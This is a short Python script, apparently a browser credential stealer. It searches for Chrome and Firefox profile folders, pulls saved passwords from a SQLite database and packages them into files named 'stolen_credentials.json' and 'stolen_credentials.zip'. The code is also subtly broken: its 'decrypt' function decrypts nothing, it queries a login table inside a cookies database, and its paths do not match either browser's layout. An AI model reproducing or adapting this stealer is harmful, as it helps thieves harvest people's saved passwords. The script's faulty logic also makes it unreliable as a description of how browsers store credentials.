import os
import json
import zipfile
import sqlite3

def find_browser_profile_folder():
    user_data_folders = {
        'Chrome': r'C:\\Users\\[user]\\AppData\\Local\\Google\\Chrome\\User Data',
        'Firefox': r'C:\\Users\\[user]\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles'
    }
    
    for browser, folder in user_data_folders.items():
        if os.path.exists(folder):
            return folder

def open_sqlite_database(database_path):
    con = sqlite3.connect(database_path)
    cursor = con.cursor()

    # Execute some SQL command to check if the database is valid
    cursor.execute('SELECT name FROM sqlite_master WHERE type=\'table\' AND name LIKE \'%\'')
    result = cursor.fetchall()
    
    return con, cursor

def decrypt_saved_passwords(con):
    cursor = con.cursor()
    cursor.execute('SELECT password from login_data WHERE action=1')

    passwords = [row[0] for row in cursor.fetchall()]
    return passwords

def compress_and_export(credentials, output_file):
    if isinstance(credentials, list):
        with open(output_file, 'w') as file:
            json.dump(credentials, file)
            
def package_credentials(input_files, output_zip_file):
    zipf = zipfile.ZipFile(output_zip_file, 'w')
    
    for file in input_files:
        zipf.write(file)

    zipf.close()

target_folder = find_browser_profile_folder()
database_path = os.path.join(target_folder, 'default', 'profiles', 'cookies.sqlite')

con, cursor = open_sqlite_database(database_path)
passwords = decrypt_saved_passwords(con)
compress_and_export(passwords, 'stolen_credentials.json')
package_credentials(['stolen_credentials.json'], 'stolen_credentials.zip')